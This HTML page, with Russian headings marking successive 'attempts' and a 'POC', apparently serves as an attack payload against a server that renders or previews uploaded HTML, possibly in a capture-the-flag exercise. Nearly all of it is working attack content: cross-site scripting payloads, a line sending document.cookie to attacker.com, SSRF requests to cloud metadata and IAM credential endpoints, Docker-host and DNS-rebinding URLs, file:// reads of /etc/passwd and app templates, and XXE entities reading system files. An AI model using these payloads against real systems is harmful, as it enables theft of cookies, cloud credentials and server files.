<!DOCTYPE html>
<html style="font-size: 16px;">
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <meta name="keywords" content="">
    <meta name="description" content="">
    <meta name="page_type" content="np-template-header-footer-from-plugin">
    <title>Тест</title>
</head>
<body>
   <a href=169.254.169.254/meta-data> ТAК </a>
  <h1>
    Hello!
  </h1>
  <iframe src=file:///etc/passwd></iframe>
<img src='/flag.txt'>
  <script>
    alert(document.cookie);
</script>
    <h2>
    Попытка 2!
  </h2>
  
  <p>Статус: <script> Вредоносный JS </script></p>
<script>var i=new Image;i.src="http://attacker.com/?"+document.cookie;</script>
  <h3>
    Попытка 3!
  </h3>
  {{$on.constructor('alert(1)')()}} 
{{constructor.constructor('alert(1)')()}}
   <img src="x" onerror="alert(1)" />
    <h4>
    Попытка 4!
  </h4>
  <input type="button" id="btn" value="Download" />
    <script>
        function download(file, text) {

            //creating an invisible element

            let element = document.createElement('a');
            element.setAttribute('href',
                'data:text/plain;charset=utf-8, '
                + encodeURIComponent(text));
            element.setAttribute('download', file);
            document.body.appendChild(element);
            element.click();

            document.body.removeChild(element);
        }

        // Start file download.

        document.getElementById("btn")
            .addEventListener("click", function () {
                let text =
                    document.getElementById("text").value;
                let filename = "index.html";

                download(filename, text);
            }, false);
    </script>
  <a href=file://templates/index.html> ТЫК </a>
  <a href=file:///templates/index.html> ТЫК </a>
  <a href=http://0.0.0.0:3000/api/data> ТЫК </a>
  <a href=http://host.docker.internal:3000> ТЫК </a>
  <a href=http://docker-host:3000> ТЫК </a>
  <a href=https://nice.artip.ru/sites/default/files/files2/cp1251.png> ТЫК </a>
   <a href=http://169.254.169.254/meta-data> !ТЫК! </a>
  <a href=http://169.254.169.254/> !ТЫК! </a>
  <a href=https://169.254.169.254/> !ТЫК! </a>
  <a href=http://169.254.169.254/metadata> !ТЫК! </a>
  <a href=https://169.254.169.254/> !СЮДА! </a>
  <a href="http://localhost:8080/templates/index.html">ТЫК</a>
<a href="http://127.0.0.1:8080/templates/index.html">ТЫК</a>
<a href="http://host.docker.internal:8080/templates/index.html">ТЫК</a>
  <script>
    function fetchFile() {
        fetch('http://localhost:8080/templates/index.html')
            .then(response => response.text())
            .then(data => {
                let element = document.createElement('a');
                element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(data));
                element.setAttribute('download', 'index.html');
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);
            })
            .catch(err => console.error(err));
    }

    document.getElementById("btn").addEventListener("click", fetchFile);
</script>
      <a href="file:///templates/index.html">ТЫК</a>
   <h2>Получить метаданные</h2>
    <a href="http://169.254.169.254/latest/meta-data/"> Получить метаданные </a>
     <a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/"> Получить IAM роли </a>
   
   <a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"> Получить данные роли </a>
     <h2>Получить метаданные</h2>
    <a href="https://169.254.169.254/latest/meta-data/"> Получить метаданные </a>
     <a href="https://169.254.169.254/latest/meta-data/iam/security-credentials/"> Получить IAM роли </a>
   
   <a href="https://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"> Получить данные роли </a>
      <script>
       fetch('http://169.254.169.254/latest/meta-data/')
           .then(response => response.text())
           .then(data => {
               alert(data); // Выводит метаданные
           })
           .catch(err => console.error(err));
   </script>
   


<script>
    function downloadFile() {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "http://localhost:8080/templates/index.html", true);
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4 && xhr.status === 200) {
                var element = document.createElement('a');
                element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(xhr.responseText));
                element.setAttribute('download', 'index.html');
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);
            }
        };
        xhr.send();
    }

    document.getElementById("btn").addEventListener("click", downloadFile);
</script>

<h1> ЕЩЕ попытка </h1>
  <!-- Добавьте это в тело вашей страницы -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="300">
    <image xlink:href="file:///app/templates/index.html"></image>
</svg>

<!-- Альтернатива с использованием XI:include -->
<svg>
    <xi:include href="file:///app/templates/index.html" xmlns:xi="http://www.w3.org/2001/XInclude"/>
</svg>
  <iframe src="file:///app/templates/index.html" width="1000" height="1000"></iframe>
<object data="file:///app/templates/index.html" width="1000" height="1000"></object>
  <!-- Пробуйте разные варианты -->
<img src="file:///app/templates/index.html">
<link rel="stylesheet" href="file:///app/templates/index.html">
  <!-- Если сервер крутится на AWS/GCP/Azure -->
<a href="http://169.254.169.254/latest/meta-data/">AWS MetaData</a>
<a href="http://metadata.google.internal/computeMetadata/v1beta1/">GCP MetaData</a>

<!-- Если сервер - это контейнер Docker, это может сработать -->
<a href="http://host.docker.internal:8080/secret.txt">File on host machine</a>
<iframe src="http://host.docker.internal:8080/admin"></iframe>
<img src="http://host.docker.internal:8080/flag.txt">
<a href="http://7f000001.0a00000a.rbndr.us:8080/debug/pprof/">Debug</a>
  <a href="http://7f000001.0a00000a.rbndr.us:8080/templates/index.html">Templates</a>
  <a href="http://7f000001.0a00000a.rbndr.us:8080/flag.txt">Flag</a>
  <a href="http://169.254.169.254/latest/meta-data/">Metadata</a>  
    <h1>
    POC!
  </h1>
  <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
  <?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
  </body>
</html>
